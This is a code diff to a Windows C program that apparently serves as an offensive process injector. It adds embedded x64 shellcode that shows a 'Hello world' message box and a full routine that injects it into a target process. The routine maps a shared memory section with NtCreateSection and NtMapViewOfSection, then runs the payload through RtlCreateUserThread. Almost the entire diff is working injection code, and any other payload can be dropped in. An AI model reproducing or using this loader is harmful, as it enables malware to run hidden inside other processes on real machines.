@@ -1,37 +1,38 @@
 #include "injector.h"
 
-NtCreateSection_t pNtCreateSection;
-NtMapViewOfSection_t pNtMapViewOfSection;
-RtlCreateUserThread_t pRtlCreateUserThread;
+// "Hello World" MessageBox shellcode
+unsigned char payload[] = 
+    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
+    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
+    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
+    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
+    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
+    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
+    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
+    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
+    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
+    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
+    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
+    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
+    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
+    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
+    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
+    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
+    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
+    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
+    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
+    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
+    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
+    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
+    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
+    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
+    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
+    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
+    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
+    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
+    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-// Resolve Addresses
-PVOID _resolve_addr(PSTR lib_name, PSTR proc_name) {
-    HMODULE hModule = GetModuleHandleA(lib_name);
-
-    if (hModule == NULL) {
-        fprintf("[!] Failed to get handle to:\t%s (0x%x)\n", lib_name, GetLastError());
-        return NULL;
-    }
-
-    PVOID addr = (PVOID)GetProcAddress(hModule, proc_name);
-    if (addr == NULL) {
-        printf("[!] Failed to resolve:\t%s (0x%x)\n", proc_name, GetLastError());
-        return NULL;
-    }
-    printf("[i] Resolved Function:\t%s(0x%p)\n", proc_name, addr);
-    return addr;
-}
-
-// Initialize all functions
-BOOL resolve_funcs() {
-    pNtCreateSection = (NtCreateSection_t)_resolve_addr("ntdll.dll", "NtCreateSection");
-    pNtMapViewOfSection = (NtMapViewOfSection_t)_resolve_addr("ntdll.dll", "NtMapViewOfSection");
-    pRtlCreateUserThread = (RtlCreateUserThread_t)_resolve_addr("ntdll.dll", "NtMapViewOfSection");
-    if (pNtCreateSection == NULL || pNtMapViewOfSection == NULL || pRtlCreateUserThread == NULL) {
-        return FALSE;
-    }
-    return TRUE;
-}
+size_t payload_len = sizeof(payload);
 
 // Find PID from a Process Name
 DWORD find_pid(const char* procname) {
@@ -76,30 +77,149 @@ DWORD find_pid(const char* procname) {
     return pid;
 }
 
-// Find thread ID in a process
-DWORD find_threadid(DWORD pid) {
-    THREADENTRY32 thEntry;
-    thEntry.dwSize = sizeof(THREADENTRY32);
-    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    BOOL result = Thread32First(hThreadSnap, &thEntry);
-    if (!result) {
-        fprintf(stderr, "[!] Thread32First() failed (0x%x)\n", GetLastError());
-        CloseHandle(hThreadSnap);
-        return 0;
+
+// map section views injection
+int inject_section_view(DWORD pid) {
+	CLIENT_ID cid;
+    NTSTATUS status; 
+    HANDLE hThread = NULL;
+    HANDLE hSection = NULL;
+    PVOID pLocalView = NULL; 
+    PVOID pRemoteView = NULL;
+
+    // Resolve Functions
+    HMODULE hNtdll = GetModuleHandle("NTDLL.DLL");
+    if (IS_HANDLE_INVALID(hNtdll)) {
+        fprintf(stderr, "[!] GetModuleHandle() failed (0x%x)\n", GetLastError());
+        return -1;
     }
 
-    while (Thread32Next(hThreadSnap, &thEntry)) {
-        if (thEntry.th32OwnerProcessID == pid) {
-            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID); 
-            if (hThread != INVALID_HANDLE_VALUE) {
-                CloseHandle(hThread);
-                CloseHandle(hThreadSnap);
-                return thEntry.th32ThreadID;
-            }
-            CloseHandle(hThread);
-        }
+	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(hNtdll, "NtCreateSection");
+    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(hNtdll, "NtMapViewOfSection");
+	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(hNtdll, "RtlCreateUserThread");
+
+    if (pNtCreateSection == NULL || pNtMapViewOfSection == NULL || pRtlCreateUserThread == NULL) {
+        fprintf(stderr, "[!] Failed to resolve functions\n");
+        return -1;
     }
-    CloseHandle(hThreadSnap);
+
+    printf("[i] 0x%p -> NtCreateSection\n", pNtCreateSection);
+    printf("[i] 0x%p -> NtMapViewOfSection\n", pNtMapViewOfSection);
+    printf("[i] 0x%p -> RtlCreateUserThread\n", pRtlCreateUserThread);
+
+	status = pNtCreateSection(
+        &hSection, 
+        SECTION_ALL_ACCESS, 
+        NULL, 
+        (PLARGE_INTEGER) &payload_len, 
+        PAGE_EXECUTE_READWRITE, 
+        SEC_COMMIT, 
+        NULL
+    );
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtCreateSection() failed (0x%x)\n", status);
+        return -1;
+    } 
+
+    if (IS_HANDLE_INVALID(hSection)) {
+        fprintf(stderr, "[!] NtCreateSection() failed to return a valid Section Handle\n");
+        return -1;
+    }
+
+    status = pNtMapViewOfSection(
+        hSection, 
+        GetCurrentProcess(), 
+        &pLocalView, 
+        NULL, 
+        NULL, 
+        NULL, 
+        (SIZE_T *) 
+        &payload_len, 
+        ViewUnmap,
+        NULL, 
+        PAGE_READWRITE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtMapViewOfSection() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        return -1;
+    } 
+
+    // Copy payload
+    memcpy(pLocalView, payload, payload_len);
+
+    // Open Handle to remote process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (IS_HANDLE_INVALID(hProcess)) {
+        fprintf(stderr, "[!] OpenProcess() failed! (0x%x)\n", GetLastError());
+        CloseHandle(hSection);
+        return -1;
+    }
+
+	// create remote section view (target process)
+	status = pNtMapViewOfSection(
+        hSection, 
+        hProcess, 
+        &pRemoteView, 
+        NULL, 
+        NULL, 
+        NULL, 
+        (SIZE_T *) 
+        &payload_len, 
+        ViewUnmap, 
+        NULL, 
+        PAGE_EXECUTE_READ
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtMapViewOfSection() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    } 
+
+
+	status = pRtlCreateUserThread(
+        hProcess, 
+        NULL, 
+        FALSE, 
+        0, 
+        0, 
+        0, 
+        pRemoteView, 
+        0, 
+        &hThread, 
+        &cid
+    );
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] RtlCreateUserThread() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    } 
+
+    if (IS_HANDLE_INVALID(hThread)) {
+        fprintf(stderr, "[!] RtlCreateUserThread returned an Invalid Handle\n");
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    }
+
+	int _result = WaitForSingleObject(hThread, -1);
+    if (_result != 0) {
+        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
+        CloseHandle(hThread);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);       
+        return -1;
+    } 
+
+    CloseHandle(hThread);
+    CloseHandle(hSection);
+    CloseHandle(hProcess);
     return 0;
 }
 
@@ -110,14 +230,15 @@ int main() {
         fprintf(stderr, "[!] No %s found\n", TARGET);
         return -1;
     }
-    printf("[i] Found %s:\t%d\n", TARGET, pid);
-
-    // Resolve Functions before beginning 
-    DWORD bResult = resolve_funcs();
-    if (!bResult) {
-        fprintf(stderr, "[!] Failed to resolve NT functions!\n");
-        return -1;
+    
+    printf("[i] %s: %d\n", TARGET, pid);
+    
+    int result = inject_section_view(pid);
+    if (result < 0) {
+        fprintf(stderr, "[!] Failed to inject payload\n");
+        return -2;
     }
 
+    printf("[i] Injection Complete!\n");
     return 0;
 }
